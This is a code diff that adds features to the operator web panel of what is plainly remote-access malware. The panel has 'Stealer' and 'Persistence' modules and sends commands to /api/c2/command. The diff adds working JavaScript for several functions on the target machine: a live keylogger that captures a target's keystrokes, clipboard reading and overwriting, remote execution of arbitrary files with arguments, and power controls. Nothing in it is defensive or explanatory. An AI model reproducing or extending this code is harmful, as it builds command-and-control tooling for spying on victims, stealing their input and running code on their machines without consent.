@@ -496,6 +496,10 @@
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
                     Remote Camera
                 </button>
+                <button class="module-nav-item" data-module="remote-exec">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                    Remote Exec
+                </button>
                 <button class="module-nav-item" data-module="stealer">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                     Stealer
@@ -788,13 +792,22 @@ C:\&gt;</div>
             <div class="module-panel" id="mod-keylogger">
                 <header class="header">
                     <h2>KeyLogger</h2>
-                    <p class="subtitle">Monitor keystrokes in real-time</p>
+                    <p class="subtitle">Capture keystrokes in real-time from the target</p>
                 </header>
                 <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
-                        <span>KeyLogger — coming soon</span>
+                    <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="btn-keylog-start" style="padding:7px 16px;font-size:12px;">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:5px;vertical-align:middle;"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            Start
+                        </button>
+                        <button class="btn btn-outline" id="btn-keylog-stop" style="padding:7px 16px;font-size:12px;" disabled>
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:5px;vertical-align:middle;"><rect x="6" y="6" width="12" height="12"/></svg>
+                            Stop
+                        </button>
+                        <button class="btn btn-outline" onclick="document.getElementById('keylog-output').textContent=''" style="padding:7px 16px;font-size:12px;">Clear</button>
+                        <span id="keylog-status" style="font-size:12px;color:var(--text-muted);margin-left:4px;">Inactive</span>
                     </div>
+                    <div id="keylog-output" style="font-family:var(--font-mono);font-size:12px;line-height:1.7;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:9px;padding:14px;min-height:200px;max-height:420px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:var(--text-primary);"></div>
                 </div>
             </div>
 
@@ -802,13 +815,30 @@ C:\&gt;</div>
             <div class="module-panel" id="mod-clipboard">
                 <header class="header">
                     <h2>Clipboard</h2>
-                    <p class="subtitle">View and modify clipboard contents</p>
+                    <p class="subtitle">Read and write clipboard contents including images</p>
                 </header>
-                <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
-                        <span>Clipboard — coming soon</span>
+                <!-- Get clipboard -->
+                <div class="panel-card" style="margin-bottom:14px;">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+                        <h3 style="margin:0;">Read Clipboard</h3>
+                        <button class="btn btn-primary" id="btn-clipboard-get" style="padding:7px 16px;font-size:12px;">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:5px;vertical-align:middle;"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                            Fetch
+                        </button>
                     </div>
+                    <div id="clipboard-text-out" style="font-family:var(--font-mono);font-size:12px;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;padding:12px;min-height:60px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:var(--text-primary);margin-bottom:10px;"></div>
+                    <div id="clipboard-img-out" style="display:none;margin-top:8px;">
+                        <p style="font-size:11px;color:var(--text-muted);margin:0 0 6px;">Image in clipboard:</p>
+                        <img id="clipboard-img" style="max-width:100%;max-height:300px;border-radius:8px;border:1px solid var(--border-color);" src="" alt="clipboard image">
+                    </div>
+                </div>
+                <!-- Set clipboard -->
+                <div class="panel-card">
+                    <h3 style="margin:0 0 12px;">Write Clipboard</h3>
+                    <textarea id="clipboard-set-input" rows="4" placeholder="Enter text to set on target clipboard..."
+                        style="width:100%;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;padding:10px 12px;color:var(--text-primary);font-size:12px;font-family:var(--font-mono);resize:vertical;outline:none;box-sizing:border-box;transition:border-color 0.2s;"
+                        onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'"></textarea>
+                    <button class="btn btn-primary" id="btn-clipboard-set" style="margin-top:10px;padding:7px 20px;font-size:12px;">Set Clipboard</button>
                 </div>
             </div>
 
@@ -852,6 +882,33 @@ C:\&gt;</div>
                 </div>
             </div>
 
+            <!-- Remote Exec -->
+            <div class="module-panel" id="mod-remote-exec">
+                <header class="header">
+                    <h2>Remote Execution</h2>
+                    <p class="subtitle">Execute files on the target machine</p>
+                </header>
+                <div class="panel-card">
+                    <div class="form-group" style="margin-bottom:12px;">
+                        <label style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-muted);display:block;margin-bottom:6px;">File Path on Target</label>
+                        <input type="text" id="exec-path" placeholder="e.g. C:\Users\user\Desktop\file.exe"
+                            style="width:100%;padding:9px 12px;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;box-sizing:border-box;transition:border-color 0.2s;"
+                            onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'">
+                    </div>
+                    <div class="form-group" style="margin-bottom:16px;">
+                        <label style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-muted);display:block;margin-bottom:6px;">Arguments <span style="font-weight:400;text-transform:none;">(optional)</span></label>
+                        <input type="text" id="exec-args" placeholder="e.g. --silent /quiet"
+                            style="width:100%;padding:9px 12px;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;box-sizing:border-box;transition:border-color 0.2s;"
+                            onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'">
+                    </div>
+                    <button class="btn btn-primary" id="btn-remote-exec" style="padding:8px 22px;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:6px;vertical-align:middle;"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                        Execute
+                    </button>
+                    <div id="exec-result" style="margin-top:14px;font-size:12px;font-family:var(--font-mono);"></div>
+                </div>
+            </div>
+
             <!-- Persistence -->
             <div class="module-panel" id="mod-persistence">
                 <header class="header">
@@ -870,12 +927,27 @@ C:\&gt;</div>
             <div class="module-panel" id="mod-power">
                 <header class="header">
                     <h2>Power</h2>
-                    <p class="subtitle">Shutdown, restart, or uninstall the client</p>
+                    <p class="subtitle">Control system power state and uninstall the client</p>
                 </header>
                 <div class="panel-card">
-                    <h3>Actions</h3>
+                    <h3 style="margin:0 0 16px;">System Power</h3>
+                    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px;">
+                        <button class="btn btn-outline" id="btn-power-shutdown" style="flex:1;min-width:110px;justify-content:center;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
+                            Shutdown
+                        </button>
+                        <button class="btn btn-outline" id="btn-power-restart" style="flex:1;min-width:110px;justify-content:center;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                            Restart
+                        </button>
+                        <button class="btn btn-outline" id="btn-power-sleep" style="flex:1;min-width:110px;justify-content:center;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+                            Sleep
+                        </button>
+                    </div>
+                    <h3 style="margin:0 0 16px;padding-top:16px;border-top:1px solid var(--border-color);">Client</h3>
                     <div style="display:flex;gap:12px;flex-wrap:wrap;">
-                        <button class="btn btn-outline" id="btn-uninstall">
+                        <button class="btn btn-outline" id="btn-uninstall" style="border-color:rgba(217,95,95,0.3);color:#d95f5f;">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                             Uninstall
                         </button>
@@ -1050,6 +1122,151 @@ C:\&gt;</div>
                     });
                 } catch {}
             }, 'Uninstall');
+        });
+
+        // Power buttons
+        document.getElementById('btn-power-shutdown').addEventListener('click', () => {
+            confirmDialog('Shutdown the target machine?', async () => {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'power_shutdown' }) });
+            }, 'Shutdown');
+        });
+        document.getElementById('btn-power-restart').addEventListener('click', () => {
+            confirmDialog('Restart the target machine?', async () => {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'power_restart' }) });
+            }, 'Restart');
+        });
+        document.getElementById('btn-power-sleep').addEventListener('click', () => {
+            confirmDialog('Put the target machine to sleep?', async () => {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'power_sleep' }) });
+            }, 'Sleep', false);
+        });
+
+        // Remote Execution
+        document.getElementById('btn-remote-exec').addEventListener('click', async () => {
+            const path = document.getElementById('exec-path').value.trim();
+            const args = document.getElementById('exec-args').value.trim();
+            const resultEl = document.getElementById('exec-result');
+            if (!path) { resultEl.innerHTML = '<span style="color:#d95f5f;">Path is required.</span>'; return; }
+            resultEl.innerHTML = '<span style="color:var(--text-muted);">Sending command...</span>';
+            try {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'remote_exec:' + path + (args ? '|' + args : '') }) });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(poll); resultEl.innerHTML = '<span style="color:var(--text-muted);">Timeout — no response.</span>'; return; }
+                    try {
+                        const r = await fetch('/api/c2/exec/result/' + encodeURIComponent(clientId));
+                        const d = await r.json();
+                        if (d && d.success !== undefined) {
+                            clearInterval(poll);
+                            resultEl.innerHTML = d.success
+                                ? `<span style="color:#5fba74;">Launched: ${escapeHtml(d.path || path)}</span>`
+                                : `<span style="color:#d95f5f;">Error: ${escapeHtml(d.error || 'unknown')}</span>`;
+                        }
+                    } catch {}
+                }, 400);
+            } catch (err) {
+                resultEl.innerHTML = '<span style="color:#d95f5f;">Error: ' + escapeHtml(err.message) + '</span>';
+            }
+        });
+
+        // Clipboard
+        document.getElementById('btn-clipboard-get').addEventListener('click', async () => {
+            const textOut = document.getElementById('clipboard-text-out');
+            const imgOut  = document.getElementById('clipboard-img-out');
+            const imgEl   = document.getElementById('clipboard-img');
+            textOut.textContent = 'Fetching...';
+            imgOut.style.display = 'none';
+            try {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'clipboard_get' }) });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(poll); textOut.textContent = 'Timeout.'; return; }
+                    try {
+                        const r = await fetch('/api/c2/clipboard/result/' + encodeURIComponent(clientId));
+                        const d = await r.json();
+                        if (d && (d.text !== undefined || d.error !== undefined)) {
+                            clearInterval(poll);
+                            if (d.error) { textOut.textContent = 'Error: ' + d.error; return; }
+                            textOut.textContent = d.text || '(empty)';
+                            if (d.image) {
+                                imgEl.src = 'data:image/png;base64,' + d.image;
+                                imgOut.style.display = 'block';
+                            }
+                        }
+                    } catch {}
+                }, 400);
+            } catch (err) { textOut.textContent = 'Error: ' + err.message; }
+        });
+
+        document.getElementById('btn-clipboard-set').addEventListener('click', async () => {
+            const text = document.getElementById('clipboard-set-input').value;
+            const btn = document.getElementById('btn-clipboard-set');
+            btn.textContent = 'Sending...'; btn.disabled = true;
+            try {
+                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ client_id: clientId, command: 'clipboard_set:' + text }) });
+                btn.textContent = 'Sent!';
+            } catch { btn.textContent = 'Error'; }
+            setTimeout(() => { btn.textContent = 'Set Clipboard'; btn.disabled = false; }, 2000);
+        });
+
+        // Keylogger
+        let _keylogActive = false;
+        let _keylogPollTimer = null;
+
+        function keylogAppend(text) {
+            const out = document.getElementById('keylog-output');
+            out.textContent += text;
+            out.scrollTop = out.scrollHeight;
+        }
+
+        async function keylogPoll() {
+            try {
+                const r = await fetch('/api/c2/keylog/poll/' + encodeURIComponent(clientId));
+                const d = await r.json();
+                if (d.entries && d.entries.length > 0) keylogAppend(d.entries.join(''));
+            } catch {}
+        }
+
+        document.getElementById('btn-keylog-start').addEventListener('click', async () => {
+            if (_keylogActive) return;
+            await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ client_id: clientId, command: 'keylog_start' }) });
+            _keylogActive = true;
+            document.getElementById('btn-keylog-start').disabled = true;
+            document.getElementById('btn-keylog-stop').disabled = false;
+            document.getElementById('keylog-status').textContent = 'Active';
+            document.getElementById('keylog-status').style.color = '#5fba74';
+            _keylogPollTimer = setInterval(keylogPoll, 500);
+        });
+
+        document.getElementById('btn-keylog-stop').addEventListener('click', async () => {
+            if (!_keylogActive) return;
+            await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ client_id: clientId, command: 'keylog_stop' }) });
+            _keylogActive = false;
+            clearInterval(_keylogPollTimer);
+            document.getElementById('btn-keylog-start').disabled = false;
+            document.getElementById('btn-keylog-stop').disabled = true;
+            document.getElementById('keylog-status').textContent = 'Inactive';
+            document.getElementById('keylog-status').style.color = 'var(--text-muted)';
+            await keylogPoll(); // final flush
+        });
+
+        // Stop keylogger when leaving the module
+        document.querySelectorAll('.module-nav-item').forEach(btn => {
+            if (btn.dataset.module !== 'keylogger') {
+                btn.addEventListener('click', () => {
+                    if (_keylogActive) document.getElementById('btn-keylog-stop').click();
+                });
+            }
         });
 
         // Remote Desktop controls
